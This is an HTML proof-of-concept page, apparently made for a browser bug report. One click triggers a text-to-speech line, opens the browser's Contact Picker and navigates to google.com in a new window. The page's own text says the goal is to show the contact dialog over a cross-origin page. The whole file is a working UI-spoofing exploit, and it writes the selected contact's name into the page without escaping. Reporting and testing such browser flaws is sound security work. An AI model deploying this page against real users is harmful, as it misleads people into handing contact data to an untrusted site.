<!DOCTYPE html>
<html lang="en">
<head>
    <title>PoC</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

    <script>
        onclick = async () => {

            // TTS ketika halaman diklik
            const utterance = new SpeechSynthesisUtterance(
                "Contact picker test started."
            );

            utterance.lang = "en-US";
            utterance.rate = 1;
            utterance.pitch = 1;

            speechSynthesis.speak(utterance);

            // Original Contact Picker logic
            (async () => {
                let contacts = await navigator.contacts.select(
                    ["name"], {}
                );

                document.write(`
                    <h1>
                        <font color="red">Selected contact:</font>
                        ${contacts[0]["name"]}
                    </h1>
                `);
            })();

            // Original cross-origin navigation logic
            open("https://www.google.com", "PoC", "_blank");
        }
    </script>
</head>

<body>
    <br><br><br>

    <center>
        <h1>
            Click anywhere on the page to show the Contact
            dialog over a cross-origin page!
        </h1>

        <p>Contact Picker + TTS Test</p>
    </center>
</body>
</html>
